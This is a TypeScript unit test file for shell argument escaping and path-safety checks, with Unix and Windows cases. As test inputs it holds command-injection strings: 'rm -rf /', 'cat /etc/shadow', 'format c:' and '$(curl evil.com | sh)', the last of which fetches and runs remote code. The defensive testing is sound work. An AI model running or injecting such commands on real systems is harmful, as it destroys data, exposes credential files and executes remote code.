/**
 * Shell Escape Utilities 单元测试
 *
 * 测试覆盖：
 * - escapeShellArg: POSIX shell 参数转义（单引号）
 * - escapeShellPath: 路径转义
 * - buildCdCommand: 构建 cd 命令（跨平台）
 * - escapeShellArgWindows: Windows cmd.exe 参数转义
 * - escapeForWindowsDoubleQuote: Windows 双引号内转义
 * - isPathSafe: 路径安全验证
 * - parseFileReferenceDrop: 解析文件引用数据
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  escapeShellArg,
  escapeShellPath,
  buildCdCommand,
  escapeShellArgWindows,
  escapeForWindowsDoubleQuote,
  isPathSafe,
  parseFileReferenceDrop,
  type FileReferenceDropData,
} from '../shell-escape';

// Mock platform detection
vi.mock('../../platform', () => ({
  isWindows: vi.fn(() => false),
}));

import { isWindows } from '../../platform';

const mockedIsWindows = vi.mocked(isWindows);

describe('escapeShellArg', () => {
  it('should wrap simple strings in single quotes', () => {
    expect(escapeShellArg('hello')).toBe("'hello'");
  });

  it('should handle strings with spaces', () => {
    expect(escapeShellArg('hello world')).toBe("'hello world'");
  });

  it('should escape single quotes with apostrophe pattern', () => {
    // "it's" → 'it'\''s'
    expect(escapeShellArg("it's")).toBe("'it'\\''s'");
  });

  it('should handle multiple single quotes', () => {
    // "it's John's" → 'it'\''s John'\''s'
    expect(escapeShellArg("it's John's")).toBe("'it'\\''s John'\\''s'");
  });

  it('should safely handle command substitution attempts', () => {
    // "$(rm -rf /)" → '$(rm -rf /)' (literal string, no execution)
    expect(escapeShellArg('$(rm -rf /)')).toBe("'$(rm -rf /)'");
  });

  it('should safely handle backtick command substitution', () => {
    expect(escapeShellArg('`rm -rf /`')).toBe("'`rm -rf /`'");
  });

  it('should safely handle pipe attempts', () => {
    expect(escapeShellArg('test | cat /etc/passwd')).toBe("'test | cat /etc/passwd'");
  });

  it('should safely handle semicolon attempts', () => {
    expect(escapeShellArg('test; rm -rf /')).toBe("'test; rm -rf /'");
  });

  it('should safely handle double quotes with shell metacharacters', () => {
    // 'test"; rm -rf / #' → 'test"; rm -rf / #'
    expect(escapeShellArg('test"; rm -rf / #')).toBe("'test\"; rm -rf / #'");
  });

  it('should handle empty string', () => {
    expect(escapeShellArg('')).toBe("''");
  });

  it('should handle paths with spaces', () => {
    expect(escapeShellArg('/path/to/my file.txt')).toBe("'/path/to/my file.txt'");
  });

  it('should handle paths with special characters', () => {
    expect(escapeShellArg('/path/$USER/file.txt')).toBe("'/path/$USER/file.txt'");
  });

  it('should handle backslashes', () => {
    expect(escapeShellArg('C:\\path\\to\\file')).toBe("'C:\\path\\to\\file'");
  });

  it('should handle newlines', () => {
    expect(escapeShellArg('line1\nline2')).toBe("'line1\nline2'");
  });

  it('should handle unicode', () => {
    expect(escapeShellArg('日本語')).toBe("'日本語'");
  });
});

describe('escapeShellPath', () => {
  it('should use escapeShellArg for paths', () => {
    expect(escapeShellPath('/home/user')).toBe("'/home/user'");
  });

  it('should handle paths with spaces', () => {
    expect(escapeShellPath('/home/my user/documents')).toBe("'/home/my user/documents'");
  });
});

describe('buildCdCommand', () => {
  beforeEach(() => {
    mockedIsWindows.mockReset();
  });

  describe('Unix (macOS/Linux)', () => {
    beforeEach(() => {
      mockedIsWindows.mockReturnValue(false);
    });

    it('should build cd command with && separator on Unix', () => {
      const result = buildCdCommand('/home/user/project');
      expect(result).toBe("cd '/home/user/project' && ");
    });

    it('should handle paths with spaces', () => {
      const result = buildCdCommand('/home/my user/my project');
      expect(result).toBe("cd '/home/my user/my project' && ");
    });

    it('should return empty string for undefined path', () => {
      expect(buildCdCommand(undefined)).toBe('');
    });

    it('should return empty string for empty string path', () => {
      expect(buildCdCommand('')).toBe('');
    });
  });

  describe('Windows', () => {
    beforeEach(() => {
      mockedIsWindows.mockReturnValue(true);
    });

    it('should build cd /d command for cmd.exe', () => {
      const result = buildCdCommand('C:\\Users\\project', 'cmd');
      expect(result).toBe('cd /d "C:\\Users\\project" && ');
    });

    it('should use semicolon for PowerShell', () => {
      const result = buildCdCommand('C:\\Users\\project', 'powershell');
      expect(result).toBe('cd /d "C:\\Users\\project"; ');
    });

    it('should escape double quotes in path', () => {
      const result = buildCdCommand('C:\\path with "quotes"');
      expect(result).toBe('cd /d "C:\\path with ""quotes""" && ');
    });

    it('should escape percent signs', () => {
      const result = buildCdCommand('C:\\%USERPROFILE%\\project');
      expect(result).toBe('cd /d "C:\\%%USERPROFILE%%\\project" && ');
    });

    it('should handle cross-drive paths', () => {
      const result = buildCdCommand('D:\\Projects\\MyProject');
      expect(result).toContain('cd /d');
    });
  });
});

describe('escapeShellArgWindows', () => {
  it('should escape carets', () => {
    expect(escapeShellArgWindows('test^value')).toBe('test^^value');
  });

  it('should escape double quotes', () => {
    expect(escapeShellArgWindows('test"value')).toBe('test^"value');
  });

  it('should escape ampersands', () => {
    expect(escapeShellArgWindows('test&value')).toBe('test^&value');
  });

  it('should escape pipes', () => {
    expect(escapeShellArgWindows('test|value')).toBe('test^|value');
  });

  it('should escape less than and greater than', () => {
    expect(escapeShellArgWindows('test<value>end')).toBe('test^<value^>end');
  });

  it('should escape percent signs', () => {
    expect(escapeShellArgWindows('%PATH%')).toBe('%%PATH%%');
  });

  it('should remove carriage returns', () => {
    expect(escapeShellArgWindows('test\rvalue')).toBe('testvalue');
  });

  it('should remove newlines', () => {
    expect(escapeShellArgWindows('test\nvalue')).toBe('testvalue');
  });

  it('should handle complex injection attempts', () => {
    // Attempt: test" & del /q C:\* "
    // After escaping: the & should be escaped as ^&
    const result = escapeShellArgWindows('test" & del /q C:\\* "');
    expect(result).toBe('test^" ^& del /q C:\\* ^"');
    // Verify that the raw & is escaped (not just & but ^&)
    expect(result).toContain('^&');
    expect(result).not.toMatch(/[^&^]&[^&]/); // No unescaped &
  });

  it('should handle normal strings unchanged', () => {
    expect(escapeShellArgWindows('normal path')).toBe('normal path');
  });

  it('should escape multiple special characters', () => {
    expect(escapeShellArgWindows('a&b|c<d>e^f%g')).toBe('a^&b^|c^<d^>e^^f%%g');
  });
});

describe('escapeForWindowsDoubleQuote', () => {
  it('should double double quotes', () => {
    expect(escapeForWindowsDoubleQuote('test"value')).toBe('test""value');
  });

  it('should escape percent signs', () => {
    expect(escapeForWindowsDoubleQuote('%PATH%')).toBe('%%PATH%%');
  });

  it('should remove carriage returns', () => {
    expect(escapeForWindowsDoubleQuote('test\rvalue')).toBe('testvalue');
  });

  it('should remove newlines', () => {
    expect(escapeForWindowsDoubleQuote('test\nvalue')).toBe('testvalue');
  });

  it('should NOT escape ampersands (protected by quotes)', () => {
    // Inside double quotes, & is literal
    expect(escapeForWindowsDoubleQuote('Company & Co')).toBe('Company & Co');
  });

  it('should NOT escape pipes (protected by quotes)', () => {
    expect(escapeForWindowsDoubleQuote('a | b')).toBe('a | b');
  });

  it('should NOT escape carets (literal in double quotes)', () => {
    expect(escapeForWindowsDoubleQuote('path^value')).toBe('path^value');
  });

  it('should handle multiple double quotes', () => {
    expect(escapeForWindowsDoubleQuote('say "hello" and "goodbye"'))
      .toBe('say ""hello"" and ""goodbye""');
  });

  it('should handle normal strings unchanged', () => {
    expect(escapeForWindowsDoubleQuote('C:\\path\\to\\file')).toBe('C:\\path\\to\\file');
  });
});

describe('isPathSafe', () => {
  it('should return true for safe paths', () => {
    expect(isPathSafe('/home/user/file.txt')).toBe(true);
    expect(isPathSafe('C:\\Users\\file.txt')).toBe(true);
    expect(isPathSafe('./relative/path')).toBe(true);
  });

  it('should detect command substitution $(...)', () => {
    expect(isPathSafe('$(whoami)')).toBe(false);
    expect(isPathSafe('/path/$(id)/file')).toBe(false);
  });

  it('should detect backtick command substitution', () => {
    expect(isPathSafe('`whoami`')).toBe(false);
    expect(isPathSafe('/path/`id`/file')).toBe(false);
  });

  it('should detect pipe', () => {
    expect(isPathSafe('/path | cat')).toBe(false);
  });

  it('should detect semicolon', () => {
    expect(isPathSafe('/path; rm -rf /')).toBe(false);
  });

  it('should detect AND operator', () => {
    expect(isPathSafe('/path && cat /etc/passwd')).toBe(false);
  });

  it('should detect OR operator', () => {
    expect(isPathSafe('/path || cat /etc/passwd')).toBe(false);
  });

  it('should detect output redirection', () => {
    expect(isPathSafe('/path > /tmp/out')).toBe(false);
  });

  it('should detect input redirection', () => {
    expect(isPathSafe('/path < /etc/passwd')).toBe(false);
  });

  it('should detect newlines', () => {
    expect(isPathSafe('/path\nrm -rf /')).toBe(false);
  });

  it('should detect carriage returns', () => {
    expect(isPathSafe('/path\rmel -rf /')).toBe(false);
  });

  it('should allow spaces in paths', () => {
    expect(isPathSafe('/path/with spaces/file')).toBe(true);
  });

  it('should allow dots in paths', () => {
    expect(isPathSafe('/path/../file')).toBe(true);
  });

  it('should allow underscores and hyphens', () => {
    expect(isPathSafe('/path/my-file_name.txt')).toBe(true);
  });
});

describe('parseFileReferenceDrop', () => {
  const createMockDataTransfer = (data: Record<string, string> = {}): DataTransfer => {
    return {
      getData: (format: string) => data[format] || '',
      setData: vi.fn(),
      clearData: vi.fn(),
      setDragImage: vi.fn(),
      types: Object.keys(data),
      items: [] as unknown as DataTransferItemList,
      files: [] as unknown as FileList,
      dropEffect: 'none' as DataTransfer['dropEffect'],
      effectAllowed: 'none' as DataTransfer['effectAllowed'],
    };
  };

  it('should parse valid file reference data', () => {
    const validData: FileReferenceDropData = {
      type: 'file-reference',
      path: '/home/user/file.txt',
      name: 'file.txt',
      isDirectory: false,
    };

    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify(validData),
    });

    const result = parseFileReferenceDrop(dataTransfer);

    expect(result).toEqual(validData);
  });

  it('should parse directory reference', () => {
    const dirData: FileReferenceDropData = {
      type: 'file-reference',
      path: '/home/user/mydir',
      name: 'mydir',
      isDirectory: true,
    };

    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify(dirData),
    });

    const result = parseFileReferenceDrop(dataTransfer);

    expect(result).toEqual(dirData);
  });

  it('should return null when no application/json data', () => {
    const dataTransfer = createMockDataTransfer({});
    const result = parseFileReferenceDrop(dataTransfer);
    expect(result).toBeNull();
  });

  it('should return null for invalid JSON', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': 'not valid json',
    });

    const result = parseFileReferenceDrop(dataTransfer);
    expect(result).toBeNull();
  });

  it('should return null for wrong type', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify({ type: 'other', path: '/path' }),
    });

    const result = parseFileReferenceDrop(dataTransfer);
    expect(result).toBeNull();
  });

  it('should return null for missing path', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify({ type: 'file-reference' }),
    });

    const result = parseFileReferenceDrop(dataTransfer);
    expect(result).toBeNull();
  });

  it('should return null for empty path', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify({ type: 'file-reference', path: '' }),
    });

    const result = parseFileReferenceDrop(dataTransfer);
    expect(result).toBeNull();
  });

  it('should use default values for optional fields', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify({
        type: 'file-reference',
        path: '/path/to/file',
        // name and isDirectory missing
      }),
    });

    const result = parseFileReferenceDrop(dataTransfer);

    expect(result).toEqual({
      type: 'file-reference',
      path: '/path/to/file',
      name: '',
      isDirectory: false,
    });
  });

  it('should handle paths with spaces', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify({
        type: 'file-reference',
        path: '/path/with spaces/file.txt',
        name: 'file with spaces.txt',
        isDirectory: false,
      }),
    });

    const result = parseFileReferenceDrop(dataTransfer);

    expect(result?.path).toBe('/path/with spaces/file.txt');
  });

  it('should handle unicode paths', () => {
    const dataTransfer = createMockDataTransfer({
      'application/json': JSON.stringify({
        type: 'file-reference',
        path: '/路径/文件.txt',
        name: '文件.txt',
        isDirectory: false,
      }),
    });

    const result = parseFileReferenceDrop(dataTransfer);

    expect(result?.path).toBe('/路径/文件.txt');
  });
});

describe('Security: Command Injection Prevention', () => {
  it('should prevent classic injection via escapeShellArg', () => {
    const maliciousInputs = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '$(whoami)',
      '`id`',
      '&& cat /etc/shadow',
      '|| rm -rf /',
      '> /etc/passwd',
      '< /etc/shadow',
      '${PATH}',
      "$(curl evil.com | sh)",
    ];

    for (const input of maliciousInputs) {
      const escaped = escapeShellArg(input);
      // All should be wrapped in single quotes, preventing execution
      expect(escaped.startsWith("'")).toBe(true);
      expect(escaped.endsWith("'")).toBe(true);
    }
  });

  it('should prevent classic injection via escapeShellArgWindows', () => {
    const maliciousInputs = [
      '" & del /q *',
      '| format c:',
      '> nul',
      '%PATH%',
      '^& whoami',
    ];

    for (const input of maliciousInputs) {
      const escaped = escapeShellArgWindows(input);
      // Special characters should be escaped
      expect(escaped).not.toBe(input);
    }
  });
});
